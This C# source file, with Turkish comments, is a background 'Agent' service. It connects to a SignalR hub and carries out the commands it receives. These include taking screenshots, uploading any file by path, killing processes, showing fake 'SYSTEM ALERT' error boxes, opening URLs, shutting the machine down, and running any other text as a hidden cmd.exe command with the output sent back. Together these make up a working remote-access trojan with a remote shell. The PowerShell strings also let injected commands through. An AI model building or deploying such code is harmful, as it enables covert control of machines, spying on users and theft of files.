using Microsoft.AspNetCore.SignalR.Client;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Text.Json;

namespace Agent;

public class Worker : BackgroundService
{
    private readonly ILogger<Worker> _logger;
    private HubConnection? _hubConnection;
    private PerformanceCounter? _cpuCounter;

    public Worker(ILogger<Worker> logger)
    {
        _logger = logger;
    }

    public override async Task StartAsync(CancellationToken cancellationToken)
    {
        if (OperatingSystem.IsWindows())
        {
            _cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            _cpuCounter.NextValue(); 
        }

        _hubConnection = new HubConnectionBuilder()
            .WithUrl("http://localhost:5000/agentHub") // Portunu kontrol et!
            .WithAutomaticReconnect()
            .Build();

        _hubConnection.On<string>("ReceiveCommand", async (cmd) => await RunCommand(cmd));

        try { await _hubConnection.StartAsync(cancellationToken); }
        catch (Exception ex) { _logger.LogError($"Bağlantı Hatası: {ex.Message}"); }

        await base.StartAsync(cancellationToken);
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            if (_hubConnection?.State == HubConnectionState.Connected && _cpuCounter != null)
            {
                try
                {
                    float cpu = _cpuCounter.NextValue();
                    await _hubConnection.InvokeAsync("SendHeartbeat", Environment.MachineName, cpu.ToString("F1"), stoppingToken);
                }
                catch { /* Ignore */ }
            }
            await Task.Delay(1000, stoppingToken);
        }
    }

    private async Task RunCommand(string command)
    {
        if (_hubConnection == null) return;
        
        try
        {
            if (command == "getprocs")
            {
                var procs = Process.GetProcesses().Select(p => new { p.Id, p.ProcessName, Memory = p.WorkingSet64 / 1024 / 1024 + " MB" }).Take(50);
                await _hubConnection.InvokeAsync("SendProcessList", JsonSerializer.Serialize(procs));
                return;
            }
            if (command.StartsWith("kill "))
            {
                int pid = int.Parse(command.Split(' ')[1]);
                Process.GetProcessById(pid).Kill();
                await _hubConnection.InvokeAsync("SendLog", $"[+] PID {pid} sonlandırıldı.");
                return;
            }

            if (command == "screenshot")
            {
                if (OperatingSystem.IsWindows())
                {
                   Rectangle bounds = new Rectangle(0, 0, 1920, 1080);
                   using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                   using (Graphics g = Graphics.FromImage(bitmap))
                   using (MemoryStream ms = new MemoryStream())
                   {
                       g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                       // Kaliteyi %50'ye düşür (Performans için)
                       ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                       EncoderParameters myEncoderParameters = new EncoderParameters(1);
                       myEncoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
                       
                       bitmap.Save(ms, jpgEncoder, myEncoderParameters);
                       await _hubConnection.InvokeAsync("SendScreenshot", Convert.ToBase64String(ms.ToArray()));
                   }
                }
                return;
            }

            if (command.StartsWith("openurl "))
            {
                string url = command.Substring(8);
                Process.Start(new ProcessStartInfo { FileName = url, UseShellExecute = true });
                await _hubConnection.InvokeAsync("SendLog", $"[+] URL Açıldı: {url}");
                return;
            }
            if (command.StartsWith("speak "))
            {
                string text = command.Substring(6);
                string ps = $"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{text}');";
                RunPowerShell(ps);
                await _hubConnection.InvokeAsync("SendLog", $"[+] Konuşuldu: {text}");
                return;
            }
            if (command.StartsWith("msgbox "))
            {
                string msg = command.Substring(7);
                string ps = $"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('{msg}', 'SYSTEM ALERT', 'OK', 'Error');";
                RunPowerShell(ps);
                await _hubConnection.InvokeAsync("SendLog", $"[+] Mesaj gösterildi.");
                return;
            }

            if (command == "shutdown")
            {
                Process.Start("shutdown", "/s /t 0");
                return;
            }
            if (command == "restart")
            {
                Process.Start("shutdown", "/r /t 0");
                return;
            }

            if (command.StartsWith("download "))
            {
                string path = command.Substring(9);
                if (File.Exists(path))
                {
                    byte[] bytes = await File.ReadAllBytesAsync(path);
                    string base64 = Convert.ToBase64String(bytes);
                    string fileName = Path.GetFileName(path);
                    await _hubConnection.InvokeAsync("SendFile", fileName, base64);
                    await _hubConnection.InvokeAsync("SendLog", $"[+] Dosya gönderiliyor: {fileName}");
                }
                else
                {
                    await _hubConnection.InvokeAsync("SendLog", "[-] Dosya bulunamadı.");
                }
                return;
            }

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = $"/c {command}";
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            
            p.OutputDataReceived += async (s, e) => { if(e.Data != null) await _hubConnection.InvokeAsync("SendLog", e.Data); };
            p.ErrorDataReceived += async (s, e) => { if(e.Data != null) await _hubConnection.InvokeAsync("SendLog", "ERR: " + e.Data); };
            
            p.Start();
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();
        }
        catch (Exception ex)
        {
            await _hubConnection.InvokeAsync("SendLog", $"HATA: {ex.Message}");
        }
    }

    private void RunPowerShell(string command)
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "powershell",
            Arguments = $"-Command \"{command}\"",
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }

    private ImageCodecInfo GetEncoder(ImageFormat format)
    {
        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
        foreach (ImageCodecInfo codec in codecs)
        {
            if (codec.FormatID == format.Guid) return codec;
        }
        return null;
    }
}